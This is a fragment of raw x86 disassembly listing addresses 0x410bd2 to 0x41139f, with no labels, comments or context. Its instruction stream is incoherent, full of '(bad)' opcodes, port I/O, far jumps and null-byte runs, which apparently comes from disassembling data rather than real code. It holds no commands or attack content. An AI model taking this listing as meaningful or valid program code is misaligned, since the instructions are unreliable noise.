  410bd2:	je     0x410b91
  410bd4:	scas   al,BYTE PTR es:[edi]
  410bd5:	lods   al,BYTE PTR ds:[esi]
  410bd6:	jl     0x410b82
  410bd8:	push   0xffffffef
  410bda:	jmp    0x6a7a:0x7c02fe6f
  410be1:	out    dx,eax
  410be2:	mov    WORD PTR [edx+eiz*8+0x5e],?
  410be6:	(bad)  
  410be7:	cmp    al,0xca
  410be9:	sbb    eax,0x40
  410bee:	add    BYTE PTR [eax],al
  410bf0:	sub    DWORD PTR [eax-0x7c],edx
  410bf3:	dec    ebp
  410bf4:	adc    eax,0x270d8651
  410bf9:	inc    ebp
  410bfa:	dec    ebx
  410bfb:	add    BYTE PTR [ecx-0x51],ch
  410bfe:	jecxz  0x410c2f
  410c00:	jp     0x410bb9
  410c02:	cmp    al,0xc0
  410c04:	fisttp WORD PTR [edi-0x54]
  410c07:	jp     0x410bf3
  410c09:	jno    0x410bfa
  410c0b:	push   eax
  410c0c:	and    edx,ecx
  410c0e:	lock add cl,ch
  410c11:	pusha  
  410c12:	xchg   DWORD PTR ds:0x4b44d1,ecx
  410c18:	jno    0x410bcd
  410c1a:	jb     0x410c8f
  410c1c:	sub    eax,0x37a368b6
  410c21:	inc    ebp
  410c22:	dec    ebx
  410c23:	add    BYTE PTR [esi-0x65],dh
  410c26:	outs   dx,BYTE PTR ds:[esi]
  410c27:	push   ss
  410c28:	stc    
  410c29:	mov    ch,0x8b
  410c2b:	(bad)  
  410c2c:	in     eax,0x83
  410c2e:	scas   eax,DWORD PTR es:[edi]
  410c2f:	pop    edi
  410c30:	div    DWORD PTR [esi-0x52530934]
  410c36:	mov    eax,DWORD PTR [ecx+edi*4-0x52]
  410c3a:	jns    0x410c71
  410c3c:	inc    DWORD PTR [edi]
  410c3e:	js     0x410bc2
  410c40:	ins    DWORD PTR es:[edi],dx
  410c41:	scas   al,BYTE PTR es:[edi]
  410c42:	pop    eax
  410c43:	call   FWORD PTR [ebp+eax*8-0x746fbfe3]
  410c4a:	cmp    DWORD PTR [eax+ebp*4],eax
  410c4d:	or     al,0xc8
  410c4f:	call   DWORD PTR [eax+0xe817b6]
  410c55:	add    BYTE PTR [eax],al
  410c57:	add    BYTE PTR [eax],al
  410c59:	out    dx,al
  410c5a:	cmp    DWORD PTR [eax],esp
  410c5c:	(bad)  
  410c5d:	adc    al,0x4b
  410c5f:	mov    bh,0xd
  410c61:	adc    ebp,DWORD PTR [esi-0x742b7ce2]
  410c67:	or     eax,DWORD PTR [eax+0x438bb385]
  410c6d:	nop
  410c6e:	mov    bl,cl
  410c70:	(bad)  
  410c71:	popf   
  410c72:	xor    ebx,DWORD PTR ds:0x6ad19040
  410c78:	ja     0x410c3d
  410c7a:	iret   
  410c7b:	or     al,bl
  410c7d:	xchg   BYTE PTR es:[ebx],al
  410c80:	or     esp,0xffffff8b
  410c83:	or     dh,BYTE PTR [ebp+0x65]
  410c86:	cmp    DWORD PTR [ecx+0x77],esp
  410c89:	adc    cl,BYTE PTR [edi+0xb]
  410c8c:	push   esi
  410c8d:	pcmpeqd mm7,QWORD PTR [ebx]
  410c90:	adc    DWORD PTR [eax-0x75],edx
  410c93:	cmp    DWORD PTR [eax+ebx*4],eax
  410c96:	or     al,0xc8
  410c98:	call   DWORD PTR [eax-0x4d17e7c2]
  410c9e:	shl    DWORD PTR [eax],0xfe
  410ca1:	or     al,0xcb
  410ca3:	mov    bh,0xd
  410ca5:	adc    esp,DWORD PTR [esi-0x1]
  410ca8:	or     BYTE PTR [ebx+ecx*4+0xb],0x80
  410cad:	popf   
  410cae:	or     DWORD PTR [ebx+eax*2-0x1267570],0xffffffa5
  410cb6:	mov    ds:0x1990401d,eax
  410cbb:	imul   edi,DWORD PTR [ebx+0x0],0x0
  410cbf:	add    BYTE PTR [eax],al
  410cc1:	add    BYTE PTR [ebx],ah
  410cc3:	inc    edi
  410cc4:	or     eax,ebx
  410cc6:	cmp    eax,0xa6501014
  410ccb:	mov    cl,0xe2
  410ccd:	or     edx,DWORD PTR [ebx]
  410ccf:	out    dx,al
  410cd0:	in     eax,0x2
  410cd2:	add    eax,0xff6e2fbe
  410cd7:	xor    al,0x29
  410cd9:	add    al,0xe6
  410cdb:	ja     0x410caf
  410cdd:	xor    esp,DWORD PTR [ecx-0x6bca1a0e]
  410ce3:	call   0x153a:0xb367c864
  410cea:	push   0x562daa5d
  410cef:	das    
  410cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cf1:	mov    eax,0xfc2339d
  410cf6:	adc    ebp,edi
  410cf8:	in     eax,0x3
  410cfa:	adc    BYTE PTR [esi-0x4d2c7f13],ah
  410d00:	out    0xd5,al
  410d02:	cs sahf 
  410d04:	lea    edx,[edx]
  410d06:	shl    BYTE PTR [edx+0x76b480ff],1
  410d0c:	in     eax,0x9b
  410d0e:	adc    ebp,eax
  410d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d11:	add    ecx,DWORD PTR [edi]
  410d13:	sahf   
  410d14:	adc    dl,BYTE PTR gs:[eax-0x4e]
  410d18:	push   0x44
  410d1a:	cmp    DWORD PTR [ebx-0xdb99c23],0xffffffe5
  410d21:	shr    esi,cl
  410d23:	popf   
  410d24:	test   DWORD PTR [edx],edx
  410d26:	add    BYTE PTR [eax],al
  410d28:	add    BYTE PTR [eax],al
  410d2a:	add    BYTE PTR [eax-0x4e],dl
  410d2d:	push   0x44
  410d2f:	arpl   bx,cx
  410d31:	jp     0x410cf2
  410d33:	fndisi(8087 only) 
  410d35:	loopne 0x410dab
  410d37:	pushf  
  410d38:	and    BYTE PTR [ecx-0x2f1d3839],dl
  410d3e:	je     0x410ccc
  410d40:	push   ds
  410d41:	jno    0x410d0a
  410d43:	mov    bh,0xe2
  410d45:	lock not BYTE PTR [edi]
  410d48:	add    al,0xf
  410d4a:	lods   eax,DWORD PTR ds:[esi]
  410d4b:	xchg   ebx,eax
  410d4c:	ja     0x410d87
  410d4e:	gs loope 0x410d44
  410d51:	push   cs
  410d52:	out    0x43,al
  410d54:	adc    dh,0x2
  410d57:	aam    0xd4
  410d59:	dec    ecx
  410d5a:	aad    0xca
  410d5c:	je     0x410ce1
  410d5e:	and    al,0xc0
  410d60:	push   0xffffffcb
  410d62:	sbb    al,0xf9
  410d64:	mov    ecx,DWORD PTR [ebx+0x492583cd]
  410d6a:	mov    ecx,0xd9197843
  410d6f:	xor    dl,0xe
  410d72:	je     0x410d8a
  410d74:	xchg   esi,esp
  410d76:	jmp    0x410d0b
  410d78:	mov    dl,0xe
  410d7a:	mov    al,ds:0x7d83ded0
  410d7f:	(bad)  
  410d81:	sub    DWORD PTR [esp+eiz*2],0x867e5de7
  410d88:	scas   al,BYTE PTR es:[edi]
  410d89:	sbb    ebp,DWORD PTR [ecx]
  410d8b:	mov    WORD PTR [ebx],gs
  410d8d:	inc    ecx
  410d8e:	jno    0x410d90
  410d90:	add    BYTE PTR [eax],al
  410d92:	add    BYTE PTR [eax],al
  410d94:	cwde   
  410d95:	out    dx,al
  410d96:	repnz rcl DWORD PTR [ebx+0x13e9cd31],cl
  410d9d:	jb     0x410dc3
  410d9f:	rcl    DWORD PTR [ebx],0x1d
  410da2:	xchg   esi,eax
  410da3:	jmp    0xcb81df4e
  410da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410da9:	out    0x5d,eax
  410dab:	push   ecx
  410dac:	in     al,dx
  410dad:	ror    BYTE PTR [ebx],cl
  410daf:	jmp    0xe8ff825e
  410db4:	push   ecx
  410db5:	mov    bl,0xe
  410db7:	pop    ds
  410db8:	iret   
  410db9:	ror    BYTE PTR [edx],cl
  410dbb:	call   0x2f3e39a5
  410dc0:	lea    esi,[esi]
  410dc2:	aas    
  410dc3:	test   eax,0x9fe93
  410dc8:	mov    eax,ds:0xb9019cd5
  410dcd:	stc    
  410dce:	leave  
  410dcf:	pop    esi
  410dd0:	jnp    0x410d81
  410dd2:	push   cs
  410dd3:	push   ebp
  410dd4:	xor    dl,BYTE PTR [edi-0x359b72a2]
  410dda:	aas    
  410ddb:	cmp    DWORD PTR [eax],0x77
  410dde:	out    0x87,eax
  410de0:	mov    WORD PTR [esi+ecx*1-0x79856375],gs
  410de7:	add    esp,esp
  410de9:	out    dx,al
  410dea:	jp     0x410df0
  410dec:	imul   esi,edx,0xffffffe4
  410def:	sbb    bh,dl
  410df1:	dec    ebx
  410df2:	repz add DWORD PTR [edi+0x7d8c74],esp
  410df9:	add    BYTE PTR [eax],al
  410dfb:	add    BYTE PTR [eax],al
  410dfd:	popa   
  410dfe:	cmp    BYTE PTR [esp+eax*1+0x6a],0xf2
  410e03:	in     al,0x3
  410e05:	push   0xfffffff2
  410e07:	das    
  410e08:	mov    ebx,DWORD PTR [esi+ebx*4-0x5086fe7a]
  410e0f:	(bad)
  410e12:	mov    dl,0x59
  410e14:	mov    ecx,DWORD PTR ds:0x78f8eb2e
  410e1a:	pop    ebp
  410e1b:	pop    ecx
  410e1c:	push   edi
  410e1d:	mov    ds:0x7c0065c7,al
  410e22:	inc    ecx
  410e23:	pop    es
  410e24:	mov    ebp,DWORD PTR [edi-0x14d4b16a]
  410e2a:	mov    cl,0x8a
  410e2c:	shl    BYTE PTR ds:0xf576f087,0xf4
  410e33:	inc    ecx
  410e34:	or     al,0x9e
  410e36:	and    bh,0x6a
  410e39:	cmp    al,0xaf
  410e3b:	push   cs
  410e3c:	test   BYTE PTR [ecx-0x7500be],ch
  410e42:	jge    0x410e2b
  410e44:	inc    edx
  410e45:	nop
  410e46:	or     eax,0xcc14000a
  410e4b:	mov    esi,0x108b0303
  410e50:	add    DWORD PTR [edx-0x30],esp
  410e53:	outs   dx,DWORD PTR ds:[esi]
  410e54:	inc    ebp
  410e55:	xchg   esp,eax
  410e56:	adc    BYTE PTR ds:0xb731882,dh
  410e5c:	paddb  mm1,QWORD PTR [ebx-0x25]
  410e60:	out    0x0,eax
  410e62:	add    BYTE PTR [eax],al
  410e64:	add    BYTE PTR [eax],al
  410e66:	jle    0x410e08
  410e68:	or     BYTE PTR [eax],al
  410e6a:	or     al,0x40
  410e6c:	mov    esi,0x2940d07
  410e71:	call   0x4a8d89
  410e76:	sbb    eax,esi
  410e78:	repnz out 0x94,eax
  410e7b:	mov    DWORD PTR [edx],ecx
  410e7d:	add    BYTE PTR [edi-0x44ff855b],bh
  410e83:	add    BYTE PTR [edi],ch
  410e85:	pop    esp
  410e86:	push   edx
  410e87:	(bad)  
  410e88:	or     ecx,DWORD PTR [edx-0x44ec7827]
  410e8e:	ins    DWORD PTR es:[edi],dx
  410e8f:	mov    DWORD PTR [ebx],ecx
  410e91:	mov    eax,esp
  410e93:	xrelease mov BYTE PTR [bx+di-0x5000],dl
  410e99:	and    edx,DWORD PTR [ebp+eax*2+0x4b63010b]
  410ea0:	loop   0x410ea2
  410ea2:	xchg   esi,esi
  410ea4:	dec    ebx
  410ea5:	rcr    DWORD PTR [ebx+ecx*4-0x7853b490],0x13
  410ead:	fcom   DWORD PTR [ecx-0x6e4ff476]
  410eb3:	leave  
  410eb4:	out    dx,eax
  410eb5:	jmp    ebp
  410eb7:	dec    esi
  410eb8:	iret   
  410eb9:	add    edx,DWORD PTR [ecx-0x280f8feb]
  410ebf:	mov    ebx,?
  410ec1:	mov    DWORD PTR [eax-0x4e],edx
  410ec4:	in     eax,0xaf
  410ec6:	xchg   esp,eax
  410ec7:	mov    ch,BYTE PTR [ebp+edx*4+0x0]
  410ecb:	add    BYTE PTR [eax],al
  410ecd:	add    BYTE PTR [eax],al
  410ecf:	nop
  410ed0:	mov    dl,0x6c
  410ed2:	inc    ecx
  410ed3:	pop    ebp
  410ed4:	jo     0x410ebf
  410ed6:	add    eax,DWORD PTR [edi+0x12ffa63c]
  410edc:	mov    ah,ch
  410ede:	scas   eax,DWORD PTR es:[edi]
  410edf:	fwait
  410ee0:	jmp    0x6b24:0x72630671
  410ee7:	xor    DWORD PTR [eax-0x4b],0xffffffac
  410eeb:	push   edx
  410eec:	cmp    esi,esp
  410eee:	inc    ebp
  410eef:	push   edi
  410ef0:	sti    
  410ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ef2:	iret   
  410ef3:	or     al,BYTE PTR [edi+0x327f2064]
  410ef9:	fldenv [eax-0x2b1a4d6d]
  410eff:	sbb    bl,BYTE PTR [edx+0xf]
  410f02:	stc    
  410f03:	and    eax,0x12d0e9f0
  410f08:	mov    esp,ebp
  410f0a:	scas   eax,DWORD PTR es:[edi]
  410f0b:	lods   al,BYTE PTR ds:[esi]
  410f0c:	jmp    0x9e37:0x94b9f81a
  410f13:	xchg   esp,eax
  410f14:	cmp    al,BYTE PTR ds:0x9c74371e
  410f1a:	or     al,0x1b
  410f1c:	dec    ecx
  410f1e:	nop    edi
  410f21:	ror    DWORD PTR [edi],0xb
  410f24:	out    dx,eax
  410f25:	leave  
  410f26:	movntps XMMWORD PTR [eax+0x86e0fdb],xmm5
  410f2d:	cld    
  410f2e:	imul   edx,DWORD PTR [edi],0xffffffd4
  410f31:	out    0x3,al
  410f33:	add    BYTE PTR [eax],al
  410f35:	add    BYTE PTR [eax],al
  410f37:	add    BYTE PTR [edi+0x9],bl
  410f3a:	pop    eax
  410f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f3c:	jmp    0xeedbf4f3
  410f41:	adc    bl,BYTE PTR [esp+eax*1-0x70]
  410f45:	das    
  410f46:	push   cs
  410f47:	int    0xbf
  410f49:	fwait
  410f4a:	push   cs
  410f4b:	inc    eax
  410f4c:	adc    al,0xb3
  410f4e:	push   cs
  410f4f:	jmp    0xf56bf69a
  410f54:	stos   DWORD PTR es:[edi],eax
  410f55:	frstor [edi-0x31d26c18]
  410f5b:	fidiv  WORD PTR [edi]
  410f5d:	ror    DWORD PTR ds:0xc62793e9,0x11
  410f64:	(bad)  
  410f65:	and    DWORD PTR ds:0x2af814e9,ecx
  410f6b:	aad    0x93
  410f6d:	mov    ds:0xb293098a,eax
  410f72:	push   cs
  410f73:	imul   esi,DWORD PTR [edi+ebp*4],0x42fee60e
  410f7a:	push   cs
  410f7b:	jmp    0xd833513
  410f80:	jl     0x410fef
  410f82:	dec    edx
  410f83:	add    eax,0x17e6b27d
  410f88:	cmp    eax,0x8c430eb1
  410f8d:	and    eax,0x8b37cd42
  410f92:	out    0xd0,al
  410f94:	lea    esi,[edx-0x2e105676]
  410f9a:	and    DWORD PTR ds:0x0,0x0
  410fa1:	xor    bh,ch
  410fa3:	xor    DWORD PTR ds:0x18bbb30,0x5e007344
  410fad:	shr    DWORD PTR [edi],cl
  410faf:	into   
  410fb0:	popa   
  410fb1:	xlat   BYTE PTR ds:[ebx]
  410fb2:	into   
  410fb3:	sbb    esi,esi
  410fb5:	pop    ds
  410fb6:	xor    edi,edi
  410fb8:	xchg   esi,eax
  410fb9:	push   ebx
  410fba:	jecxz  0x410fa2
  410fbc:	sbb    ch,0xb0
  410fbf:	push   cs
  410fc0:	ret    
  410fc1:	xchg   ebx,eax
  410fc2:	and    eax,0x8a9d0042
  410fc7:	out    0x9e,eax
  410fc9:	sub    DWORD PTR [esi+ecx*1+0x1c532580],0x0
  410fd1:	sbb    al,0xb2
  410fd3:	add    esi,0xffffffa0
  410fd6:	mov    bl,0xef
  410fd8:	(bad)  
  410fd9:	mov    ecx,0x12483fb
  410fde:	lods   eax,DWORD PTR ds:[esi]
  410fdf:	push   cs
  410fe0:	add    BYTE PTR [esi-0xd],ch
  410fe3:	sub    edx,DWORD PTR [eax-0x45]
  410fe6:	scas   al,BYTE PTR es:[edi]
  410fe7:	push   cs
  410fe8:	enter  0x6ef6,0xef
  410fec:	out    0xa7,eax
  410fee:	push   ebp
  410fef:	or     eax,0x2784a600
  410ff4:	jae    0x410fb3
  410ff6:	mov    dh,0x81
  410ff8:	test   BYTE PTR [ebp+0x69000d82],cl
  410ffe:	out    dx,eax
  410fff:	dec    ebx
  411000:	and    al,0xa1
  411002:	jmp    0x41104f
  411004:	and    al,0x0
  411006:	add    BYTE PTR [eax],al
  411008:	add    BYTE PTR [eax],al
  41100a:	jne    0x410f92
  41100c:	or     BYTE PTR [ebp+ecx*4-0x76],0xc8
  411011:	inc    esp
  411012:	lea    ecx,[edx-0x495675f9]
  411018:	out    0x61,al
  41101a:	mov    ds:0x396a0eb6,al
  41101f:	jmp    0x410fa4
  411021:	and    al,0x85
  411023:	mov    ah,0xe
  411025:	add    BYTE PTR [ecx-0x1e8d48e],dh
  41102b:	jb     0x411058
  41102d:	sub    BYTE PTR [ecx-0x14],cl
  411030:	das    
  411031:	add    BYTE PTR [ecx],dl
  411033:	pop    edi
  411034:	and    eax,0x56cd2902
  411039:	dec    DWORD PTR [edx+edx*8]
  41103c:	sbb    eax,0x7434f940
  411041:	or     BYTE PTR [eax+0xb0c9f5b],dl
  411047:	xchg   esp,eax
  411048:	ror    DWORD PTR [edx-0x68],cl
  41104b:	fisub  DWORD PTR [ecx]
  41104d:	dec    DWORD PTR [ebx-0x47]
  411050:	or     eax,0xcbd29376
  411055:	pop    es
  411056:	xlat   BYTE PTR ds:[ebx]
  411057:	shl    WORD PTR [edx+0x54],cl
  41105b:	pop    ebx
  41105c:	jbe    0x4110a1
  41105e:	ins    BYTE PTR es:[edi],dx
  41105f:	jnp    0x4110d3
  411061:	inc    ebx
  411062:	je     0x410fe7
  411064:	jbe    0x4110a9
  411066:	ins    BYTE PTR es:[edi],dx
  411067:	pop    edi
  411068:	fisttp DWORD PTR [esp+ebx*2+0xc6d77f]
  41106f:	add    BYTE PTR [eax],al
  411071:	add    BYTE PTR [eax],al
  411073:	dec    esp
  411074:	ja     0x411045
  411076:	ror    DWORD PTR [edi+0x1b],cl
  411079:	or     eax,esi
  41107b:	dec    esp
  41107c:	ja     0x411051
  41107e:	call   DWORD PTR [esi-0x61]
  411081:	out    dx,al
  411082:	sub    ebx,DWORD PTR [eax+0x77ffcbe5]
  411088:	adc    DWORD PTR [ebp-0x502c8801],0x23
  41108f:	and    DWORD PTR [eax],0xffffffaf
  411092:	and    eax,DWORD PTR [edi+ebp*8-0x246fc048]
  411099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41109a:	and    eax,DWORD PTR [ebx-0x60398ba5]
  4110a0:	sahf   
  4110a1:	xor    dl,ch
  4110a3:	(bad)  
  4110a4:	rol    DWORD PTR [ebx-0x24a46fc7],cl
  4110aa:	(bad)  
  4110ab:	jge    0x411120
  4110ad:	mov    esp,0x1e389043
  4110b2:	adc    al,0x83
  4110b4:	fwait
  4110b5:	or     bh,BYTE PTR ds:0xb5a92
  4110bb:	xchg   edi,edx
  4110bd:	imul   edi,ebp,0xf
  4110c0:	mov    dl,0x68
  4110c2:	(bad)  
  4110c3:	gs or  eax,0x755c207d
  4110c9:	scas   eax,DWORD PTR es:[edi]
  4110ca:	jp     0x4110cc
  4110cc:	fsubr  st(5),st
  4110ce:	js     0x41112d
  4110d0:	mov    edx,0xb4b8635d
  4110d5:	in     eax,0x2d
  4110d7:	add    BYTE PTR [eax],al
  4110d9:	add    BYTE PTR [eax],al
  4110db:	add    BYTE PTR [ebx-0x6a],dl
  4110de:	in     eax,dx
  4110df:	add    al,0xcf
  4110e1:	mov    bh,0x61
  4110e3:	mov    dh,0x8f
  4110e5:	mov    dl,0x91
  4110e7:	(bad)  
  4110e8:	sbb    al,BYTE PTR [eax-0x4cf096e3]
  4110ee:	in     eax,0x7a
  4110f0:	int    0xf
  4110f2:	and    al,0xff
  4110f4:	scas   eax,DWORD PTR es:[edi]
  4110f5:	add    edi,DWORD PTR [ebp-0x39]
  4110f8:	jae    0x4110b8
  4110fa:	xchg   edi,eax
  4110fb:	jp     0x41114f
  4110fd:	mov    esi,0x3a5b7a90
  411102:	ins    BYTE PTR es:[edi],dx
  411103:	ret    0xb3fb
  411106:	ins    BYTE PTR es:[edi],dx
  411107:	pushf  
  411108:	sbb    ah,BYTE PTR [ebp+0x7c]
  41110b:	shl    BYTE PTR [ebx-0x45c1f33e],1
  411111:	cmp    BYTE PTR [edi],0x0
  411114:	mov    ds:0x5debdc72,eax
  411119:	test   DWORD PTR [ecx],0xce6910c
  41111f:	jg     0x411162
  411121:	icebp  
  411122:	or     al,0x79
  411124:	jmp    0xe728:0x9625dca2
  41112b:	hlt    
  41112c:	add    eax,0x9379d0bf
  411131:	retf   0xbe2b
  411134:	addr16 mov dh,0xee
  411137:	scas   al,BYTE PTR es:[edi]
  411138:	dec    edx
  411139:	ss xchg ebx,eax
  41113b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41113c:	sub    bl,BYTE PTR [esi+ecx*1-0x1a]
  411140:	add    BYTE PTR [eax],al
  411142:	add    BYTE PTR [eax],al
  411144:	add    BYTE PTR [ecx+0x49de84b5],bl
  41114a:	test   BYTE PTR [edi+0x23],0xc4
  41114e:	out    0xc4,al
  411150:	fs (bad) 
  411152:	lock std 
  411154:	sbb    cl,BYTE PTR [edi+ebp*4+0x4f]
  411158:	scas   eax,DWORD PTR es:[edi]
  411159:	fdiv   DWORD PTR [ecx+0x2]
  41115c:	jmp    0xe8636d73
  411161:	xchg   ebx,eax
  411162:	mov    dl,0x5b
  411164:	pushf  
  411165:	lds    ecx,FWORD PTR [eax]
  411167:	test   BYTE PTR [ebp-0x50],ch
  41116a:	sti    
  41116b:	or     eax,0xe43b93e9
  411170:	jb     0x41112f
  411172:	cmp    ah,BYTE PTR [edx-0x33]
  411175:	(bad)  
  411176:	cmp    edx,ebp
  411178:	shr    ah,cl
  41117a:	mov    bl,0xff
  41117c:	imul   ecx,DWORD PTR [edx-0x5f16f16c],0xb7adc765
  411186:	mov    ds:0x70b4ed13,eax
  41118b:	(bad)  
  41118c:	sub    eax,0xdeefab70
  411191:	mov    ah,0xf0
  411193:	sub    DWORD PTR [ebp+0x57],0xb
  411197:	push   cs
  411198:	jmp    0x2488130
  41119d:	and    eax,0x1a69ffb7
  4111a2:	mov    ds:0x33a5e90e,al
  4111a7:	sub    dl,BYTE PTR [ecx]
  4111a9:	add    BYTE PTR [eax],al
  4111ab:	add    BYTE PTR [eax],al
  4111ad:	add    BYTE PTR [ebx-0x3714f14e],dl
  4111b3:	xor    ebp,DWORD PTR [edx]
  4111b5:	cmp    DWORD PTR [ebx-0x89ff14e],edx
  4111bb:	xchg   edx,eax
  4111bc:	ss adc eax,0x823b9a
  4111c2:	push   ebp
  4111c3:	jg     0x4111d3
  4111c5:	add    BYTE PTR [ecx],ch
  4111c7:	call   0xebc23617
  4111cc:	push   ebx
  4111cd:	and    al,0x9d
  4111cf:	jmp    0x411214
  4111d1:	and    al,0xd1
  4111d3:	jmp    0x411160
  4111d5:	and    al,0x45
  4111d7:	mov    ah,0xe
  4111d9:	add    BYTE PTR [edx-0x19],dh
  4111dc:	sub    eax,DWORD PTR [eax-0x8]
  4111df:	mov    dl,0xe
  4111e1:	mov    dh,BYTE PTR [ebx+esi*4]
  4111e4:	push   DWORD PTR [ebp+0x247bec79]
  4111ea:	xchg   ecx,eax
  4111eb:	jmp    0x411268
  4111ed:	and    al,0x95
  4111ef:	out    dx,al
  4111f0:	dec    ebx
  4111f1:	and    al,0xea
  4111f3:	jmp    0x411250
  4111f5:	and    al,0xc5
  4111f7:	xor    ebp,esi
  4111f9:	jbe    0x4111a9
  4111fb:	in     eax,dx
  4111fc:	loop   0x41122e
  4111fe:	mov    ecx,0x3bb5ffb2
  411203:	mov    BYTE PTR ds:0x2b95a941,ah
  411209:	test   DWORD PTR [eax+0x6e004e8b],ebp
  41120f:	loopne 0x411253
  411211:	add    DWORD PTR [eax],eax
  411213:	add    BYTE PTR [eax],al
  411215:	add    BYTE PTR [eax],al
  411217:	jle    0x411225
  411219:	dec    ebx
  41121a:	add    ch,BYTE PTR [eax]
  41121c:	cwde   
  41121d:	pop    es
  41121e:	or     esi,DWORD PTR [ecx]
  411220:	aaa    
  411221:	jb     0x411226
  411223:	stos   BYTE PTR es:[edi],al
  411224:	aas    
  411225:	inc    ebx
  411226:	and    al,0x7d
  411228:	ror    DWORD PTR [ecx+0xeb269bb],0xa1
  41122f:	leave  
  411230:	sbb    eax,0x7ab0004b
  411235:	sub    edx,DWORD PTR [eax]
  411237:	mov    ah,0xf6
  411239:	add    BYTE PTR [edx+ecx*8-0x6ffff14a],al
  411240:	rcr    bl,1
  411242:	arpl   WORD PTR [bp+di],bx
  411245:	retf   0xcc88
  411248:	jg     0x4111f5
  41124a:	push   cs
  41124b:	out    0x96,al
  41124d:	push   es
  41124e:	mov    esp,ecx
  411250:	jg     0x4111f9
  411252:	mov    dl,BYTE PTR [edi-0x71]
  411255:	add    BYTE PTR [ebx-0x54],0x83
  411259:	add    BYTE PTR [esi+0x6c],0xc0
  41125d:	dec    ecx
  41125e:	mov    BYTE PTR [edi+edi*4-0x66],cl
  411262:	mov    dl,BYTE PTR [eax+edi*4]
  411265:	retf   0x9000
  411268:	pop    ebx
  411269:	loopne 0x41122b
  41126b:	or     DWORD PTR [eax],ebx
  41126d:	out    0x73,eax
  41126f:	or     DWORD PTR [eax],ebx
  411271:	out    0x6b,eax
  411273:	sbb    ebx,DWORD PTR [ecx+0xd97c0df]
  411279:	fiadd  WORD PTR [eax+eax*1]
  41127c:	add    BYTE PTR [eax],al
  41127e:	add    BYTE PTR [eax],al
  411280:	or     DWORD PTR [eax],ebx
  411282:	out    0x77,eax
  411284:	xchg   DWORD PTR ds:0xbad105c6,ecx
  41128a:	add    cl,BYTE PTR [ebx]
  41128c:	fsub   DWORD PTR [ebp+edx*2+0x44]
  411290:	mov    dl,ah
  411292:	sahf   
  411293:	and    ecx,DWORD PTR [eax]
  411295:	pop    esp
  411296:	or     eax,DWORD PTR [eax]
  411298:	lahf   
  411299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41129a:	fld    QWORD PTR [esi]
  41129c:	push   ecx
  41129d:	jp     0x4112a2
  41129f:	or     ecx,DWORD PTR [eax-0x20]
  4112a2:	xchg   DWORD PTR [ebx],esp
  4112a4:	enter  0xb5a,0x0
  4112a8:	or     DWORD PTR [eax-0x1d972fb8],esi
  4112ae:	(bad)  
  4112af:	and    ebx,esp
  4112b1:	loopne 0x411237
  4112b3:	adc    DWORD PTR [eax+0x14890b5b],0xffffffb7
  4112ba:	mov    bh,bh
  4112bc:	inc    edi
  4112bd:	mov    dl,0xe5
  4112bf:	mov    ss,WORD PTR [esi]
  4112c1:	dec    edx
  4112c2:	in     eax,0x3
  4112c4:	nop
  4112c5:	cmp    ebp,DWORD PTR [ecx-0x19]
  4112c8:	sbb    esi,DWORD PTR [edx-0x1eafc1b]
  4112ce:	shl    DWORD PTR [ebx-0x7836c9f8],0x17
  4112d5:	ins    DWORD PTR es:[edi],dx
  4112d6:	in     eax,0x22
  4112d8:	arpl   WORD PTR [esi-0x42b8772b],dx
  4112de:	js     0x411340
  4112e0:	lods   al,BYTE PTR ds:[esi]
  4112e1:	mov    dl,0xe5
  4112e3:	adc    al,BYTE PTR [eax]
  4112e5:	add    BYTE PTR [eax],al
  4112e7:	add    BYTE PTR [eax],al
  4112e9:	or     BYTE PTR [ebx+0x3],cl
  4112ec:	add    al,0x90
  4112ee:	xor    DWORD PTR [edx],ebp
  4112f0:	or     DWORD PTR [ecx],ebx
  4112f2:	fiadd  WORD PTR [ecx]
  4112f4:	add    BYTE PTR ds:0x1e12e507,cl
  4112fa:	mov    eax,0xbd351c64
  4112ff:	imul   eax,DWORD PTR [edx-0x70],0xb886e5b2
  411306:	aam    0xe0
  411308:	xchg   ebp,ebx
  41130a:	mov    dl,0xe5
  41130c:	add    edx,DWORD PTR [ebx]
  41130e:	imul   ecx,DWORD PTR [ecx+0xe312297],0xffffffa8
  411315:	and    ebx,esp
  411317:	fs sbb al,0x2f
  41131a:	out    0xd1,eax
  41131c:	adc    al,BYTE PTR [esi-0x2]
  41131f:	out    0x12,al
  411321:	ds mul bl
  411324:	inc    edx
  411325:	jo     0x4112e2
  411327:	cld    
  411328:	dec    ebx
  411329:	xchg   edx,eax
  41132a:	pop    ecx
  41132b:	into   
  41132c:	in     eax,dx
  41132d:	xchg   edx,eax
  41132e:	mov    dl,0xe5
  411330:	mov    WORD PTR [ebx],ss
  411332:	xchg   edi,eax
  411333:	sub    DWORD PTR [ebx],eax
  411335:	nop
  411336:	mov    dl,0x25
  411338:	mov    ah,0xa2
  41133a:	jb     0x41134a
  41133c:	sub    DWORD PTR [esi+eax*1],eax
  41133f:	lock jne 0x41137a
  411342:	or     BYTE PTR [esi],cl
  411344:	jmp    0x37044adc
  411349:	jno    0x41136a
  41134b:	sub    dh,BYTE PTR ds:0x0
  411351:	add    BYTE PTR [ebx-0x3771f14e],dl
  411357:	(bad)  
  411358:	push   edx
  411359:	call   0x3630c5f1
  41135e:	sub    BYTE PTR [eax],cl
  411360:	push   cs
  411361:	jmp    0x6f5d6df9
  411366:	mov    cl,0x6c
  411368:	cmp    esi,DWORD PTR [eax]
  41136a:	shr    DWORD PTR [eax-0x20f01133],cl
  411370:	cs jmp 0xd60f4909
  411376:	xchg   esp,eax
  411377:	lods   eax,DWORD PTR ds:[esi]
  411378:	adc    BYTE PTR [ebp-0x4f],al
  41137b:	ins    BYTE PTR es:[edi],dx
  41137c:	jmp    DWORD PTR [ebx-0x7b]
  41137f:	nop
  411380:	push   cs
  411381:	jmp    0xfd6bf21a
  411386:	jp     0x41130d
  411388:	or     al,0xe9
  41138a:	xchg   ebx,eax
  41138b:	mov    ebx,0xbb8fb4b8
  411390:	mov    eax,0xec7196ac
  411395:	loope  0x41132b
  411397:	or     BYTE PTR [ebx],0x1b
  41139a:	mov    ebp,0x92b12a3f
  41139f:	mov    dl,0xe
